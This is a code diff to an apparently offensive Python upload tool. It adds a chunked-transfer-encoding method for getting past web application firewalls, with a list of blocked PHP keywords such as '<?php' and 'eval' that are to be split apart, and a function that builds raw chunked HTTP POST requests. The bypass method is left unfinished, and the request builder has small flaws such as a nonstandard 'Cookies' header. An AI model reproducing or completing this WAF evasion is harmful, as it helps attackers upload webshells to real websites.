@@ -3,8 +3,8 @@
 #author:Jinhao
 
 import sys
-import os
-from comman import *
+import HackRequests
+from auto_build_chunk import *
 from color_output import *
 
 """
@@ -205,6 +205,17 @@ class General:
                 self.end(check=check, stop=self.stop)
         return
 
+    def chunkBypass(self):
+        '''
+        分块传输绕waf
+        :return:
+        '''
+        blackwords = [   # 拆分单词，自行完善
+            '<?php', 'phpinfo()', 'eval'
+        ]
+        file_data = open(self.p_file, 'rb').read()   # 文件内容
+
+
 
     def getSuffix(self, filename):
         # 获取文件名后缀
@@ -302,10 +313,36 @@ class General:
             print(red('[ Error ]') + yellow('读取文件失败'))
             sys.exit()
 
-    def waf_baidu(self):
-        '''
-        1、对文件名大小没有验证
-        :return:
-        '''
-        pass
+    def genChunkRaw(self, url, raw_data, cookies=''):
+        # 构造chunk请求体
+        host = url.split('://')[-1].split('/')[0]
+        if url.startswith('http'):
+            scheme = url.split('://')[0].upper()
+        else:
+            scheme = 'HTTP'
+        path = url.split(host)[-1]
+
+        raw = '''
+POST /{path} {scheme}/1.1
+Host: {host}
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookies: {cookies}
+Transfer-Encoding: Chunked
+
+{data}
+        '''.format(
+            scheme=scheme,
+            host=host,
+            path=path,
+            data=raw_data,
+            cookies=cookies
+        )
+        print(raw)
+        return raw
 
